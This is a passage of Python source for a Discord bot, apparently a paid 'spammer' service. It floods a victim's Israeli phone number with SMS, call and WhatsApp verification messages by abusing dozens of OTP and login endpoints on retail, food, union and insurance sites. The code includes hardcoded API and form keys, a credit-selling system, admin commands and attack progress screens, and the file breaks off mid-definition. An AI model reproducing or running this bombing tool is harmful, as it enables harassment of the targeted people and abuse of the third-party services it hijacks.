                form_data={"configCode": "ivr2_10_23", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305", "gr": "0cAFcWeA5PbEgcsunaaEtl6NGj42rsCw_j-mRZXXcpIwHiMkRv8_z5ALroAy4nrB5H0d9_3EmAT5lir9rdEUmYgJcljVuwkmXejS2XpA8D-SslaqIGDAxdoPpt8avI4LEirhzVHZS84ELsjkcSVnE9MHDQf4uGnuT99SpOJqr5vrQ8eamoK2JopgSoYOeSJ-jxvTkahhmphpEWQM6hqtF0MU80L7zXTCiBd0pizXHWf904G_emSIqIrmaU5bgE9EM6gH3Zj8hcVmI-7L-eQ0vRdQioD_TAC4WhCJ4GRwhKqNIM3VVh3OoT8I24BqoT1VPptonhRje1XR7g1gB_vRbQieoXLXkHq8oCX5PgC9AtSbHwD88F7bfyNRlt5n44OPa5UnBnIx58aJlDk5sRXqV9EHpJOVMg08S4M4FzIDbYEKOPHHrnfWujAdjNsHfkmjezSFcfk4IAAgjCTfkXlxhGZ6lKKoJzbX7p3n1NcmtJ2M9W3nU01-J3w6e4PmR3gDXTp2LvkBQPUf2V-ZeHaQZYMAZDKnkgbLDrgmUofR232uXigH8MDrKyctqUeXJdApEFZnPg4OGvSXXCNx5qmDRnjsgf_S-nFOBJhyAXqh2H-1i8d5lHD0NO-fXB9gj_bPd5g9Dy9fBG96bsYrAnpzOGDoETucSkhY9nh9ZR7eS5efKUTf_UD-Ml6sYdEmdaL-vj90IZFwHKTf51n5XJ7DpU9gSO-TlOH4_RoGFdbO4Cbyf1QgPuJe1oRVl4XCnad4EEyO1WRL5D33Rg-SLWzDMHUrjzKYVcX6TJyledkhCyaVpiG5-Jtc4P2ER1Vd9qhZoXTmyY8Qhxku8fpiur6Kgn7vJhz21gmFfytzHwQyFxMNtYKGGy9i3f_vrcVZtAn-Hl9AOLh825jWS3dGIou4zIaAoWxIyHTPF1YewbwXXLxguzD1b0OdLN-4H2aaGG5-4xj4Kpj0ObbCJSXNYrkRZ6lXS--aOoHreDg4rMN8os-_lyKHQvxvQbNAbC3u9xf73X_zpNPU6riKHRIVDnZvUMdpm_fPtnc3w6Vc5aTMJJPmP-axLkT4g0hd9j8RaCkXKMSaszT60elGULw-t-oA79BkTi2x5xuStGScG_35Kk9kP6B7mvtuDmhqQe1c5vabCuj_ueyWod8LXeEpX5wPOKjyDNVhjSS4IJt_LDLl1ecc4seD6s9yC1INKUQFIe52J37ekfrh2rLSqw1ERZ2Vl_YziFDTE4OHpAh1Y3rOI4jqXaYyRVnt4PvNBjkYuPcImXrQxB-yM6AHA_5QzZByozp2ZD39zVPzC6uATt72ZLXnoxNE6Bxa0QkOElaIuSkHv0JiL4VPzjPgE4J3cTK9zESKE7M7KO89NUToDVJ6vrT06MnY12nZJtYjtgLoba0nqVl1512nIHV12bK3MZpbOzrl2hNoEMbUM-KZsyMlnoQZHy2_n8I3YZwgTMTD2Os6YGSG4IViPy2xZ-jf70bmBaT48XgW0JDPKIGXSMZYY9SEIn4FnbvE0iageIOaRA8GI8urP5Gm345SPFFlTJHOPFYZncz8wmbFOb6Sj2lhO0PBT6rWMpmEpjpSFatJkCRxocQVrcTLZx8nrgvmoGDieH_RG--juXCrwmcAiX0hN56lKOFpoh0RUX6mQTPY1X1O7M05l7iYpy3D_l_KcxgpDg61AdYuq_oFC_xdd99bVScV-2YcxAIkx4ggpU7IuLOHtvoPn-bftPxaOSI3gepj0TbIioHZ4dvSI3-RgGHRWVmb7GRntKT7r5VqT10frTJEa9ZtIyrH2QfRBWB0SaSBZ7pjEtmK1hoBouEdimg8JyTnSfq64DtJZnStDTWEdC6dpqOXbeI3fgV6angRqH9dJxY_Mgjo1Rj7Oo_xr2UadXo3kLj_p3CLfG8ryBcZnK0OtHm-w0EzdS6ouaNdfQZ6a0BcYPlCli605PEf3C2Ef-LCCYGIQjZ4hdvkXHE5YSyroCzUUNtI9HRLWsIildw9LUHz4G4U5fLlilCQq0L2W3VS-0OBrpJU2e17wRL3802ILYquN2KRrbtQz0-IllIPPEqX52EF5lBV7L1dnguGK5Lr1417W9l9mdhnUkAuE_T9dQ7_mucqcgFu3EZCAkMWEb6cuae4SELDtLQ1ch_CFQR1oGpe8wLnsyEwboyoe-nr2nfwLnuC7sc5ugnliWgc6GLMlVQQEbrLKGD9tQS98nT-LKVUrqyQkcmFE", "phone": "0504414408", "sendCodeBy": "CALL", "step": "SendValidPhone", "token": "menualWS_ymta", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305"},
                custom_headers={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"},
                tag="call2all.co.il"),
            send_http_request(session, "POST", "https://rest-api.dibs-app.com/otps",
                json_data={"phoneNumber": formatted_number},
                custom_headers=build_json_headers("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
                tag="dibs"),
            send_http_request(session, "POST", "https://www.nine-west.co.il/customer/ajax/post/",
                form_data=f"bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
                tag="nine-west"),
            send_http_request(session, "POST", "https://www.leecooper.co.il/customer/ajax/post/",
                form_data=f"bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
                tag="leecooper"),
            send_http_request(session, "POST", "https://www.kikocosmetics.co.il/customer/ajax/post/",
                form_data=f"bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
                tag="kikocosmetics"),
            send_http_request(session, "POST", "https://www.topten-fashion.com/customer/ajax/post/",
                form_data=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
                tag="topten-fashion"),
            send_http_request(session, "POST", "https://www.hoodies.co.il/customer/ajax/post/",
                form_data=f"form_key=kxMwRR4nj3lOH7Aq&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                tag="hoodies"),
            send_http_request(session, "POST", "https://www.lehamim.co.il/_a/aff_otp_auth",
                form_data=f"phone={raw_number}",
                custom_headers={**build_form_headers("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
                tag="lehamim"),
            send_http_request(session, "POST", "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
                json_data={"password": None, "phoneNr": raw_number, "sendType": 1, "systemType": None},
                custom_headers=build_json_headers("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="555"),
            send_http_request(session, "POST", "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                form_data=f"action=simply-check-member-cellphone&cellphone={raw_number}",
                custom_headers=build_form_headers("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
                tag="jungle-club"),
            send_http_request(session, "POST", "https://blendo.co.il/wp-admin/admin-ajax.php",
                form_data=f"action=simply-check-member-cellphone&cellphone={raw_number}",
                custom_headers=build_form_headers("https://blendo.co.il", "https://blendo.co.il/"),
                tag="blendo"),
            send_http_request(session, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                json_data={"phoneNumber": raw_number, "sourceFrom": "AuthJS", "isCalling": True},
                custom_headers=build_json_headers("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
                tag="mishloha"),
            send_http_request(session, "POST", "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
                json_data={"type": "otp", "data": {"phone": raw_number}},
                tag="webcut"),
            send_http_request(session, "POST", "https://middleware.freetv.tv/api/v1/send-verification-sms",
                json_data={"msisdn": raw_number},
                custom_headers=build_json_headers("https://freetv.tv", "https://freetv.tv/"),
                tag="freetv"),
            send_http_request(session, "POST", "https://we.care.co.il/wp-admin/admin-ajax.php",
                form_data=(f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=https://discord.gg/freespammer&form_fields[phone]={raw_number}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"),
                custom_headers=build_form_headers("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
                tag="we.care"),
            send_http_request(session, "POST", "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
                form_data=f"MosadId=7000297&ClientName=https://discord.gg/freespammer&Phone={raw_number}&Amount=100&Tashlumim=1",
                custom_headers={"Content-Type": FORM_TYPE, "accept-encoding": "gzip, deflate", "referer": "https://www.matara.pro/", "origin": "https://www.matara.pro"},
                tag="matara"),
            send_http_request(session, "POST", "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
                form_data=(f"action=otp_register&otp_phone={raw_number}&first_name=יגאל&last_name=ראובן&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"),
                custom_headers=build_form_headers("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/%D7%9E%D7%95%D7%A2%D7%93%D7%95%D7%9F-t-club/?"),
                tag="wissotzky"),
            send_http_request(session, "POST", "https://clocklb.ok2go.co.il/api/v2/users/login",
                json_data={"phone": raw_number},
                custom_headers=build_json_headers("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="ok2go"),
            send_http_request(session, "POST", "https://api-endpoints.histadrut.org.il/signup/send_code",
                json_data={"phone": raw_number},
                custom_headers={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://signup.histadrut.org.il", "referer": "https://signup.histadrut.org.il/", "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189", "sec-fetch-site": "same-site"},
                tag="histadrut"),
            send_http_request(session, "POST", "https://www.papajohns.co.il/_a/aff_otp_auth",
                form_data=f"phone={raw_number}",
                custom_headers={**build_form_headers("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
                tag="papajohns"),
            send_http_request(session, "POST", "https://www.iburgerim.co.il/_a/aff_otp_auth",
                form_data=f"phone={raw_number}",
                custom_headers={**build_form_headers("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
                tag="iburgerim"),
            send_http_request(session, "GET", f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw_number}",
                custom_headers={"referer": "https://www.americanlaser.co.il/calc/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "accept-encoding": "gzip, deflate"},
                tag="americanlaser"),
            send_http_request(session, "POST", f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={raw_number}",
                json_data={"id": session_id, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw_number},
                custom_headers=build_json_headers("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
                tag="beecomm"),
            send_http_request(session, "POST", "https://xtra.co.il/apps/api/inforu/sms",
                json_data={"phoneNumber": raw_number},
                custom_headers={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://xtra.co.il", "referer": "https://xtra.co.il/pages/brand/cafe-cafe", "sec-fetch-site": "same-origin"},
                tag="xtra"),
            send_http_request(session, "POST", "https://www.lighting.co.il/customer/ajax/post/",
                form_data=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"),
                tag="lighting"),
            send_http_request(session, "POST", "https://proxy1.citycar.co.il/api/verify/login",
                json_data={"phoneNumber": formatted_number, "verifyChannel": 2, "loginOrRegister": 1},
                custom_headers=build_json_headers("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
                tag="citycar"),
            send_http_request(session, "POST", "https://www.lilit.co.il/customer/ajax/post/",
                form_data=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.lilit.co.il", "https://www.lilit.co.il/"),
                tag="lilit"),
            send_http_request(session, "POST", "https://www.urbanica-wh.com/customer/ajax/post/",
                form_data=f"bot_validation=1&type=login&telephone={raw_number}",
                custom_headers=build_form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                tag="urbanica"),
            send_http_request(session, "POST", "https://www.castro.com/customer/ajax/post/",
                form_data=f"bot_validation=1&type=login&telephone={raw_number}",
                custom_headers=build_form_headers("https://www.castro.com", "https://www.castro.com/"),
                tag="castro"),
            send_http_request(session, "POST", "https://www.bathandbodyworks.co.il/customer/ajax/post/",
                form_data=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
                tag="bathandbodyworks"),
            send_http_request(session, "POST", "https://www.golbary.co.il/customer/ajax/post/",
                form_data=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"),
                tag="golbary"),
            send_http_request(session, "POST", "https://api.getpackage.com/v1/graphql/",
                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw_number}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},
                custom_headers=build_json_headers("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
                tag="getpackage"),
            send_http_request(session, "POST", "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
                form_data=f"otp_login_nonce=de90e8f67b&phone={raw_number}&security=de90e8f67b",
                custom_headers={**build_form_headers("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
                tag="ohmama"),
            send_http_request(session, "POST", "https://server.myofer.co.il/api/sendAuthSms",
                json_data={"phoneNumber": raw_number},
                custom_headers=build_json_headers("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
                tag="myofer"),
            send_http_request(session, "POST", "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                form_data=f"action=user_login_step_1&phone_number={raw_number}&step[]=1",
                custom_headers=build_form_headers("https://arcaffe.co.il", "https://arcaffe.co.il/"),
                tag="arcaffe"),
            send_http_request(session, "POST", "https://api.noyhasade.co.il/api/login?origin=web",
                json_data={"phone": raw_number, "email": False, "ip": "1.1.1.1"},
                custom_headers=build_json_headers("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
                tag="noyhasade"),
        ] + atmos_club_tasks

        all_results = await asyncio.gather(*attack_tasks, return_exceptions=True)
        success_count = 0
        failure_list = []
        
        for res in all_results:
            if isinstance(res, Exception):
                continue
            elif isinstance(res, tuple):
                if len(res) == 3:
                    ok, name, reason = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(f"{name} ({reason})")
                else:
                    ok, name = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(name)

        for res in atmos_results:
            if isinstance(res, Exception):
                continue
            elif isinstance(res, tuple):
                if len(res) == 3:
                    ok, name, reason = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(f"{name} ({reason})")
                else:
                    ok, name = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(name)

        return success_count, failure_list

def create_control_panel_embed():
    embed = discord.Embed(
        title="⚡ CyberIL Operations | לוח בקרה",
        color=COLOR_BLACK,
        description=(
            f"ברוך הבא למרכז השליטה.\n"
            f"למדריך והסברים מפורטים: <#{INFO_CHANNEL}>\n"
            "──────────────────────────"
        )
    )
    embed.add_field(name="🚀 שיגור מתקפה", value="`SMS` • `Calls` • `WhatsApp`\n*(צריכת קרדיטים בהתאם לשימוש)*", inline=False)
    embed.add_field(name="📊 היתרה שלי", value="לחץ לבדיקת קרדיטים", inline=True)
    embed.add_field(name="💳 טעינת חשבון", value=f"[לרכישה באתר הישיר]({PURCHASE_URL})", inline=True)
    embed.set_footer(text="CyberIL System • Secure Connection • 2026")
    return embed

class StopAttackButton(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=600)
        self.user_id = user_id

    @discord.ui.button(label="🛑 עצור ספאם", style=discord.ButtonStyle.danger)
    async def stop_attack_action(self, interaction, button):
        if interaction.user.id != self.user_id and not is_admin_user(interaction):
            await interaction.response.send_message("❌ לא ההתקפה שלך.", ephemeral=True)
            return
        stop_event = active_attacks.get(self.user_id)
        if stop_event:
            stop_event.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmAttackView(discord.ui.View):
    def __init__(self, phone, total_rounds, cost, user_id):
        super().__init__(timeout=30)
        self.phone = phone
        self.total_rounds = total_rounds
        self.cost = cost
        self.user_id = user_id

    @discord.ui.button(label="✅ כן, התחל", style=discord.ButtonStyle.danger)
    async def start_attack_confirm(self, interaction, button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך.", ephemeral=True)
            return
        self.stop()

        try:
            await interaction.response.defer()
        except Exception:
            return

        for _ in range(self.cost):
            if not await deduct_single_credit(self.user_id):
                await interaction.edit_original_response(embed=discord.Embed(title="❌ אין מספיק קרדיטים.", color=COLOR_DARK_RED), view=None)
                return

        attack_event = asyncio.Event()
        active_attacks[self.user_id] = attack_event

        progress = discord.Embed(title="🚀 ספאם בפעולה", description=f"מתקיף את **{self.phone}** — ~{self.cost * 35} שניות", color=COLOR_RED)
        progress.set_footer(text="לחץ על עצור כדי לבטל.")
        await interaction.edit_original_response(embed=progress, view=StopAttackButton(self.user_id))

        total_success = 0
        total_failed = 0

        try:
            for _ in range(self.total_rounds):
                if attack_event.is_set():
                    break
                s, f = await execute_all_attacks(self.phone)
                total_success += s
                total_failed += f

            await apply_target_cooldown(self.phone)
            active_attacks.pop(self.user_id, None)
            was_stopped = attack_event.is_set()

            await save_attack_log(
                user_id=self.user_id,
                username=str(interaction.user),
                phone=self.phone,
                credits=self.cost,
                successes=total_success,
                fails=total_failed,
                duration=self.cost * 35
            )

            remaining = await display_balance(self.user_id)
            result_embed = discord.Embed(title="🛑 נעצר" if was_stopped else "✅ התקפה הושלמה", color=COLOR_DARK_RED)
            result_embed.add_field(name="📱 יעד", value=self.phone, inline=True)
            result_embed.add_field(name="⏱️ משך", value=f"~{self.cost * 35} שניות", inline=True)
            result_embed.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
            result_embed.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
            result_embed.add_field(name="💰 קרדיטים נותרים", value=remaining, inline=True)
            await interaction.edit_original_response(embed=result_embed, view=None)

        except Exception as error:
            active_attacks.pop(self.user_id, None)
            await interaction.edit_original_response(embed=discord.Embed(title="❌ שגיאה", description=str(error)[:180], color=COLOR_DARK_RED), view=None)

    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary)
    async def cancel_attack_confirm(self, interaction, button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך.", ephemeral=True)
            return
        self.stop()
        await interaction.response.edit_message(embed=discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים.", color=COLOR_DARK_RED), view=None)

class AttackModal(discord.ui.Modal, title="🚀 התחל ספאם"):
    phone_field = discord.ui.TextInput(label="מספר טלפון", placeholder="054XXXXXXX", min_length=10, max_length=10, style=discord.TextStyle.short)
    credits_field = discord.ui.TextInput(label="קרדיטים לשימוש (מקסימום 100)", placeholder="למשל 5", min_length=1, max_length=3, style=discord.TextStyle.short)

    async def on_submit(self, interaction):
        phone = self.phone_field.value.strip()
        if not re.match(r"^05[0-9]{8}$", phone):
            await interaction.response.send_message("❌ מספר לא חוקי — חייב להיות **05XXXXXXXX**", ephemeral=True)
            return

        try:
            credits = int(self.credits_field.value.strip())
            if credits < 1 or credits > MAX_CREDIT_USAGE:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(f"❌ חייב להיות 1–{MAX_CREDIT_USAGE}.", ephemeral=True)
            return

        user_id = interaction.user.id
        total_rounds = credits * CREDITS_PER_ROUND

        balance = await get_user_credits(user_id)
        has_unlimited = await has_lifetime_access(user_id)

        if balance < credits and not has_unlimited:
            await interaction.response.send_message(f"❌ צריך **{credits}** קרדיטים | יש לך **{balance}**", ephemeral=True)
            return

        on_cooldown, remaining_time = await check_target_cooldown(phone)
        if on_cooldown:
            await interaction.response.send_message(f"⏳ מספר בקואלדאון — **{remaining_time} שניות** נותרו.", ephemeral=True)
            return

        balance_text = await display_balance(user_id)
        confirm_embed = discord.Embed(title="⚠️ אשר ספאם", description=f"```\nיעד     : {phone}\nמשך     : ~{credits * 35} שניות\nעלות    : {credits} קרדיטים  |  יתרה: {balance_text}\n```", color=COLOR_ORANGE)
        await interaction.response.send_message(embed=confirm_embed, view=ConfirmAttackView(phone=phone, total_rounds=total_rounds, cost=credits, user_id=user_id), ephemeral=True)

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="💳 רכישת קרדיטים", style=discord.ButtonStyle.link, url=PURCHASE_URL))

    @discord.ui.button(label="💣 ספאם לטלפון", style=discord.ButtonStyle.danger, custom_id="cp_launch")
    async def launch_attack(self, interaction, button):
        current_time = time.time()
        last_use = cooldown_tracker.get(interaction.user.id, 0)
        if current_time - last_use < LAUNCH_DELAY:
            remaining = int(LAUNCH_DELAY - (current_time - last_use))
            try:
                await interaction.response.send_message(f"⏳ קואלדאון — **{remaining} שניות** נותרו.", ephemeral=True)
            except discord.errors.NotFound:
                pass
            return
        cooldown_tracker[interaction.user.id] = current_time
        try:
            await interaction.response.send_modal(AttackModal())
        except discord.errors.NotFound:
            pass

    @discord.ui.button(label="💰 הקרדיטים שלי", style=discord.ButtonStyle.primary, custom_id="cp_balance")
    async def show_balance_panel(self, interaction, button):
        user_id = interaction.user.id
        balance_text = await display_balance(user_id)
        user_stats = await get_user_statistics(user_id)

        embed = discord.Embed(title="💰 היתרה שלך", description=f"**{balance_text}** קרדיטים", color=COLOR_RED)
        if user_stats:
            embed.add_field(name="📊 סך התקפות", value=str(user_stats.get("total_attacks", 0)), inline=True)
            embed.add_field(name="✅ סך הצלחות", value=str(user_stats.get("total_success", 0)), inline=True)
            embed.add_field(name="❌ סך כשלונות", value=str(user_stats.get("total_failed", 0)), inline=True)
            embed.add_field(name="💎 קרדיטים ששימשו", value=str(user_stats.get("total_credits", 0)), inline=True)

        try:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.errors.NotFound:
            pass

class FreeCreditsView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל 5 קרדיטים", style=discord.ButtonStyle.danger, custom_id="free_credits_claim")
    async def claim_free(self, interaction, button):
        user_id = interaction.user.id
        now_timestamp = time.time()
        try:
            await interaction.response.defer(ephemeral=True)
        except Exception:
            return

        claim_record = await settings_db.find_one({"_id": user_id, "type": "free_credits"})
        if claim_record:
            time_diff = now_timestamp - claim_record.get("last_claim", 0)
            if time_diff < 86400:
                hours_left = int((86400 - time_diff) // 3600)
                minutes_left = int(((86400 - time_diff) % 3600) // 60)
                cooldown_embed = discord.Embed(title="⏳ כבר מימשת היום", description=f"חזור בעוד **{hours_left} שעות {minutes_left} דקות**", color=COLOR_DARK_RED)
                await interaction.followup.send(embed=cooldown_embed, ephemeral=True)
                return

        await add_credits_to_user(user_id, 5)
        await settings_db.update_one({"_id": user_id, "type": "free_credits"}, {"$set": {"last_claim": now_timestamp}}, upsert=True)

        new_balance = await display_balance(user_id)
        success_embed = discord.Embed(title="🎁 +5 קרדיטים!", description=f"יתרה חדשה: **{new_balance}** קרדיטים\nחזור מחר!", color=COLOR_RED)
        await interaction.followup.send(embed=success_embed, ephemeral=True)

@bot.event
async def on_ready():
    bot.add_view(MainPanel())
    bot.add_view(FreeCreditsView())
    await tree.sync()
    print(f"✅ CyberIL Spamer התחבר → {bot.user}")
    print(f"📡 מחובר ל-{len(bot.guilds)} שרתים")

    await asyncio.sleep(2)

    try:
        panel_channel = bot.get_channel(BOMB_AUTO_CHANNEL)
        if panel_channel:
            await panel_channel.purge(limit=5)
            await panel_channel.send(embed=create_control_panel_embed(), view=MainPanel())
            print(f"✅ לוח בקרה נשלח לערוץ {panel_channel.name}")
        else:
            print(f"❌ לא נמצא ערוץ עם ID: {BOMB_AUTO_CHANNEL}")

        free_channel = bot.get_channel(FREE_CREDITS_CHANNEL)
        if free_channel:
            gift_embed = discord.Embed(title="🎁 מתנה חינם!", description="כל אחד יכול לקבל **5 קרדיטים חינם** לשימוש בספאמר!\n\nניתן לממש פעם אחת כל **24 שעות**.", color=0x000000)
            await free_channel.purge(limit=5)
            await free_channel.send(embed=gift_embed, view=FreeCreditsView())
            print(f"✅ הודעת קרדיטים נשלחה לערוץ {free_channel.name}")
        else:
            print(f"❌ לא נמצא ערוץ עם ID: {FREE_CREDITS_CHANNEL}")

    except Exception as error:
        print(f"שגיאה בהתחברות: {error}")

@tree.command(name="checkmycredit", description="בדוק את היתרה הנוכחית שלך")
@app_commands.describe(member="משתמש לבדיקה (השאר ריק לעצמך)")
async def check_balance_slash(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    balance_text = await display_balance(target.id)
    user_stats = await get_user_statistics(target.id)

    embed = discord.Embed(title="💰 קרדיטים", description=f"{target.mention} — **{balance_text}** קרדיטים", color=COLOR_RED)
    if user_stats:
        embed.add_field(name="📊 סך התקפות", value=str(user_stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(user_stats.get("total_success", 0)), inline=True)
        embed.add_field(name="❌ כשלונות", value=str(user_stats.get("total_failed", 0)), inline=True)

    await interaction.response.send_message(embed=embed)

@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים למשתמש")
@app_commands.describe(member="משתמש יעד", amount="כמות להוספה")
async def add_credit_slash(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ חייב להיות חיובי.", ephemeral=True)
        return
    await add_credits_to_user(member.id, amount)
    new_balance = await display_balance(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_RED)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_balance, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים ממשתמש")
@app_commands.describe(member="משתמש יעד", amount="כמות להסרה")
async def remove_credit_slash(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ חייב להיות חיובי.", ephemeral=True)
        return
    await remove_credits_from_user(member.id, amount)
    new_balance = await display_balance(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_DARK_RED)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_balance, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[ADMIN] הענק קרדיטים ללא הגבלה למשתמש")
@app_commands.describe(member="משתמש יעד")
async def grant_lifetime_slash(interaction: discord.Interaction, member: discord.Member):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer()
    await set_lifetime_status(member.id, True)
    embed = discord.Embed(title="♾️ הוענק ללא הגבלה", description=f"{member.mention} קיבל **קרדיטים ללא הגבלה**.", color=COLOR_RED)
    await interaction.followup.send(embed=embed)

@tree.command(name="removelifetime", description="[ADMIN] הסר קרדיטים ללא הגבלה ממשתמש")
@app_commands.describe(member="משתמש יעד")
async def revoke_lifetime_slash(interaction: discord.Interaction, member: discord.Member):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer()
    await set_lifetime_status(member.id, False)
    embed = discord.Embed(title="♾️ הוסר ללא הגבלה", description=f"{member.mention} כבר לא בעל קרדיטים ללא הגבלה.", color=COLOR_DARK_RED)
    await interaction.followup.send(embed=embed)

@tree.command(name="freecredits", description="[ADMIN] פרסם את הודעת הקרדיטים החינמיים")
async def post_free_credits_slash(interaction: discord.Interaction):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    embed = discord.Embed(title="🎁 מתנה חינם!", description="כל אחד יכול לקבל **5 קרדיטים חינם** לשימוש בספאמר!\n\nניתן לממש פעם אחת כל **24 שעות**.", color=0x000000)
    await interaction.response.send_message(embed=embed, view=FreeCreditsView())

@tree.command(name="giveall", description="[ADMIN] תן קרדיטים לכולם")
@app_commands.describe(amount="כמות לתת לכולם")
